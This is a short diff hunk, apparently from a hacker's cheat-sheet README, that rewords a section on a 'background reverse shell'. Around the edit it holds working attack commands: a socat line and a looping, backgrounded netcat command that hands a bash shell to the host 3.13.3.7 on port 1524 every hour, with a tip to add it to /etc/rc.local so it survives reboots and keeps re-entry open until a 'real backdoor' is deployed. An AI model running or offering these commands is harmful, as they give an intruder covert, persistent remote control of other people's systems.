@@ -435,7 +435,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 <a id="bdrs-anchor"></a>
 **6.i. Background reverse shell**
 
-A reverse shell that keeps trying to connect back to us every 3600 seconds (indefinately). Often used until a real backdoor has been deployed. Add to */etc/rc.local* if required...
+A reverse shell that keeps trying to connect back to us every 3600 seconds (indefinately). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. Add to */etc/rc.local* if required...
 
 ```
 $ (while :; do nc -e /bin/bash -vn 3.13.3.7 1524; sleep 3600; done ) &>/dev/null &
